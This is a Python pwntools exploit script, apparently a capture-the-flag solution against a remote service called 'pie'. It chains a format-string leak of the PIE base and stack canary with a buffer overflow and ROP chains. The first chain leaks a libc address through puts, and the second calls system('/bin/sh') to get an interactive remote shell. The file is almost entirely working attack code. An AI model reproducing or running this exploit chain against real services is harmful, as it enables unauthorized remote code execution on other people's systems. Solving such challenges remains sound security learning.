#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './pie')

host = args.HOST or 'netconf.num.edu.mn'
port = int(args.PORT or 10000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()
format_string = "|".join(["%p" for _ in range(50)])

io.recvuntil(b"What is your recipe?\n")
io.sendline(b"%45$p|%39$p")
# io.sendline(format_string.encode())

io.recvuntil(b"Get ready your pie. This pie has:\n")

leaks = io.recvline().strip(b"\n").split(b"|")
print(leaks)

base = int(leaks[0],16)-exe.symbols.main
canary = int(leaks[1],16)
exe.address = base

pop_rdi=base+0x000000000000120d
ret=base+0x000000000000101a
# pop_rdi=base+0x00000000000011b9
# ret=base+0x0000000000001016

# input()
payload= b"A"*264
payload+= p64(canary)
payload+= p64(ret)
payload+= p64(pop_rdi)
payload+= p64(exe.got.puts)
payload+= p64(exe.plt.puts)
payload+= p64(exe.symbols.main)

io.recvuntil(b"Is it delicious\n")
io.sendline(payload)
io.recvuntil(b"Thank you\n")

leaked= io.recv(6).strip().ljust(8, b"\x00")
leaked = u64(leaked)
print("printf",hex(leaked))

libc = ELF("./libc6_2.35-0ubuntu3.4_amd64.so",checksec=False)
# libc = ELF("./libc6_2.35-0ubuntu3.5_amd64.so",checksec=False)
# libc = ELF("./libc.so.6",checksec=False)
# libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
libc_base=leaked-libc.symbols.puts
libc.address=libc_base

io.sendlineafter(b"What is your recipe?\n", b"%39$p")
io.recvuntil(b"Get ready your pie. This pie has:\n")

canary=int(io.recvline(),16)

payload= b"A"*264
payload+=p64(canary)
payload+=b"A"*8
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(next(libc.search(b"/bin/sh")))
payload+=p64(libc.symbols.system)

print("canary",hex(canary))
print("ret",hex(ret))
print("pop_rdi",hex(pop_rdi))
print("/bin/sh",hex(next(libc.search(b"/bin/sh"))))
print("system",hex(libc.symbols.system))

io.sendlineafter(b"Is it delicious\n",payload)
io.interactive()